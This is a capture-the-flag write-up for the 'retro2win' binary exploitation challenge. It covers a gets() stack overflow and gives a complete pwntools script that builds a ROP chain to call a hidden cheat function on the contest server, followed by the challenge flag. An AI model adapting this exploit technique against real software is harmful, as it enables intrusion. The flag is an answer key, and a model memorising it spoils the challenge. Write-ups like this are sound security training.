https://ctftime.org/event/2446

# retro2win (pwn)

So retro.. So winning..

nc retro2win.ctf.intigriti.io 1338

## Analysis

`main` @ `0x004008b7`
- If we provide `1337` as input to `scanf(%d)` we call `enter_cheatcode`

`enter_cheatcode` @ `0x004007ee`
- This function calls `gets` with a buffer on the stack offset `0x18` from the return address

`cheat_mode` @ `0x00400736`
- This function checks if `rdi` contains `0x2323232323232323` and if `rsi` contains `0x4242424242424242` on entry
    - If they do it prints the flag

## Solution

1) Supply `1337` to call `enter_cheatcode`
2) ROP to `cheat_mode(0x2323232323232323, 0x4242424242424242)`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./retro2win", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("retro2win.ctf.intigriti.io", 1338)

p.sendlineafter(b"option:\r\n", str(0x539).encode())

rop = ROP(elf)
rop.raw(b"A" * 0x18)
rop.rdi = 0x2323232323232323
rop.rsi = 0x4242424242424242
rop.call("cheat_mode")

p.sendlineafter(b"Enter your cheatcode:\r\n", rop.chain())

p.readuntil(b"FLAG: ")

print(p.readline()[:-2].decode()) # INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}
```

## Flag
`INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}`

smiley 2024/11/16
